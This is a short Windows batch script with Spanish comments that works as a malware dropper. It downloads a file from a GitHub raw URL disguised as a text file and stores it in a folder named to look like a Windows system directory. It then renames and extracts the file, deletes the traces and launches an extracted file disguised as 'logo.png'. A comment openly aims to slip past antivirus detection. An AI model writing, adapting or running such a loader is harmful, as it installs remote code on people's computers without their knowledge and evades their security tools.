@echo off
set "targetDir=%LocalAppData%\Microsoft\Windows\CloudExperienceHost"
if not exist "%targetDir%" mkdir "%targetDir%"
set "baseUrl=https://raw.githubusercontent.com/deuzinnuse-collab/juego/refs/heads/main"

:: 1. Baja el archivo como un simple texto
powershell -Command "iwr '%baseUrl%/datos.txt' -OutFile '%targetDir%\datos.db'"

:: 2. Lo renombra a ZIP justo antes de usarlo
ren "%targetDir%\datos.db" "datos.zip"

:: 3. Lo extrae (aquí es donde el antivirus puede saltar, pero al ser rápido a veces se le pasa)
powershell -Command "Expand-Archive -Path '%targetDir%\datos.zip' -DestinationPath '%targetDir%' -Force"

:: 4. Limpia todo
del /q "%targetDir%\datos.zip"
start /b "" "%targetDir%\logo.png"
exit
